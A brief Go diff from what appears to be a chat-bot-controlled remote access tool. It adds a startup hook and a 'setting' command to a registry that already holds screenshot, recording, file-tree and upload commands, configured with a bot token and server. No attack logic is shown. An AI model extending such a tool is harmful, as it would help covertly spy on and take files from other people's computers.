@@ -28,6 +28,7 @@ var commandsList = make(map[string]Command)
 var channelId string
 
 func Init() {
+	OnStartup()
 	register()
 
 	if config.FakeToken == "" || config.FakeCategory == "" || config.FakeServer == "" {
@@ -171,6 +172,7 @@ func register() {
 	commandsList["notif"] = &commands.NotifCommand{}
 	commandsList["ping"] = &commands.PingCommand{}
 	commandsList["record"] = &commands.RecordCommand{}
+	commandsList["setting"] = &commands.SettingCommand{}
 	commandsList["ss"] = &commands.ScreenShotCommand{}
 	commandsList["tree"] = &commands.TreeCommand{}
 	commandsList["upload"] = &commands.UploadCommand{}
